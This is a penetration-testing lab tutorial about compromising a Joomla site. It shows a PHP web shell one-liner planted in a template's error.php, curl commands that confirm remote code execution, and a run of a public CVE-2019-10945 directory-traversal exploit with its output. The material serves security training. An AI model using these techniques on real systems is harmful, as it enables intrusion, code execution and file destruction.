# 

---

We now know that we are dealing with a Joomla e-commerce site. If we can gain access, we may be able to land in the client's internal environment and begin enumerating the internal domain environment. Like WordPress and Drupal, Joomla has had its fair share of vulnerabilities against the core application and vulnerable extensions. Furthermore, like the others, it is possible to gain remote code execution if we can log in to the admin backend.

---

## Abusing Built-In Functionality

During the Joomla enumeration phase and the general research hunting for company data, we may come across leaked credentials that we can use for our purposes. Using the credentials that we obtained in the examples from the last section, `admin:admin`, let's log in to the target backend at `http://dev.inlanefreight.local/administrator`. Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.

If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

   

![Joomla control panel with update notification, PHP warning, and statistics permission request. Displays post-installation messages and user actions.](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.

   

![Joomla templates page requesting permission to collect statistics, showing styles Beez3 and Protostar.](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

   

![Joomla template customization page requesting permission to collect statistics, with options to select and manage files.](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)

Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.

Code: php

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

   

![Joomla template editor for Protostar, editing error.php with a system command vulnerability, and a request for statistics permission.](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

  Attacking Joomla

```shell-session
xF1NN@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. We should be sure, once again, to note down this change for our report appendices and make every effort to remove the PHP snippet from the `error.php` page.

---

## Leveraging Known Vulnerabilities

At the time of writing, there have been [426](https://www.cvedetails.com/vulnerability-list/vendor_id-3496/Joomla.html) Joomla-related vulnerabilities that received CVEs. However, just because a vulnerability was disclosed and received a CVE does not mean that it is exploitable or a working public PoC exploit is available. Like with WordPress, critical vulnerabilities (such as those remote code execution) that affect Joomla core are rare. Searching a site such as `exploit-db` shows over 1,400 entries for Joomla, with the vast majority being for Joomla extensions.

Let's dig into a Joomla core vulnerability that affects version `3.9.4`, which our target `http://dev.inlanefreight.local/` was found to be running during our enumeration. Checking the Joomla [downloads](https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html) page, we can see that `3.9.4` was released in March of 2019. Though it is out of date as we are on Joomla `4.0.3` as of September 2021, it is entirely possible to run into this version during an assessment, especially against a large enterprise that may not maintain a proper application inventory and is unaware of its existence.

Researching a bit, we find that this version of Joomla is likely vulnerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) which is a directory traversal and authenticated file deletion vulnerability. We can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945). We can also use it to delete files (not recommended). This could lead to access to sensitive files such as a configuration file or script holding credentials if we can then access it via the application URL. An attacker could also cause damage by deleting necessary files if the webserver user has the proper permissions.

We can run the script by specifying the `--url`, `--username`, `--password`, and `--dir` flags. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above.

  Attacking Joomla

```shell-session
xF1NN@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

---

## Moving On

Next, let's take a look at Drupal, which, while it holds a much smaller share of the CMS market, is still used by companies worldwide.